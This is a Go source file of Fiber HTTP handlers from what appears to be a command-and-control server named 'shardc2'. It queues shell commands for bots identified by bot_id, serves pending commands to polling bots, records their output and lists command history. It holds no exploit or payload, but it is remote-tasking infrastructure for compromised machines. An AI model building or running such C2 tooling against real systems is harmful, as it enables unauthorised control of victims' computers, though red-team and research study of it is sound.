package handlers

import (
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/shardc2/shardc2/internal/database"
)

type CommandHandler struct {
	db *database.DB
}

func NewCommandHandler(db *database.DB) *CommandHandler {
	return &CommandHandler{db: db}
}

func (h *CommandHandler) Create(c *fiber.Ctx) error {
	var req struct {
		BotID   string `json:"bot_id"`
		Type    string `json:"type"`
		Payload string `json:"payload"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if req.Type == "" {
		req.Type = "shell"
	}

	var cmdID string
	err := h.db.QueryRow(`
		INSERT INTO commands (bot_id, type, payload)
		VALUES ($1, $2, $3) RETURNING id`,
		req.BotID, req.Type, req.Payload,
	).Scan(&cmdID)

	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to create command"})
	}

	return c.Status(201).JSON(fiber.Map{"id": cmdID, "status": "pending"})
}

func (h *CommandHandler) GetPending(c *fiber.Ctx) error {
	botID := c.Params("bot_id")
	rows, err := h.db.Query(`
		SELECT id, type, payload FROM commands
		WHERE bot_id = $1 AND status = 'pending'
		ORDER BY created_at ASC`, botID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to fetch commands"})
	}
	defer rows.Close()

	var cmds []fiber.Map
	for rows.Next() {
		var id, cmdType, payload string
		if err := rows.Scan(&id, &cmdType, &payload); err != nil {
			continue
		}
		cmds = append(cmds, fiber.Map{"id": id, "type": cmdType, "payload": payload})
	}
	if cmds == nil {
		cmds = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"commands": cmds})
}

func (h *CommandHandler) SubmitResult(c *fiber.Ctx) error {
	var req struct {
		CommandID string `json:"command_id"`
		Output    string `json:"output"`
		Status    string `json:"status"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if req.Status == "" {
		req.Status = "completed"
	}

	now := time.Now()
	result, err := h.db.Exec(`
		UPDATE commands SET output = $1, status = $2, executed_at = $3
		WHERE id = $4`, req.Output, req.Status, now, req.CommandID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to submit result"})
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return c.Status(404).JSON(fiber.Map{"error": "command not found"})
	}
	return c.JSON(fiber.Map{"status": "received"})
}

func (h *CommandHandler) History(c *fiber.Ctx) error {
	botID := c.Params("bot_id")
	rows, err := h.db.Query(`
		SELECT id, type, payload, COALESCE(output, ''), status, created_at, executed_at
		FROM commands WHERE bot_id = $1
		ORDER BY created_at DESC LIMIT 50`, botID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to fetch history"})
	}
	defer rows.Close()

	var cmds []fiber.Map
	for rows.Next() {
		var id, cmdType, payload, output, status string
		var createdAt time.Time
		var executedAt *time.Time
		if err := rows.Scan(&id, &cmdType, &payload, &output, &status, &createdAt, &executedAt); err != nil {
			continue
		}
		cmds = append(cmds, fiber.Map{
			"id": id, "type": cmdType, "payload": payload, "output": output,
			"status": status, "created_at": createdAt, "executed_at": executedAt,
		})
	}
	if cmds == nil {
		cmds = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"commands": cmds})
}
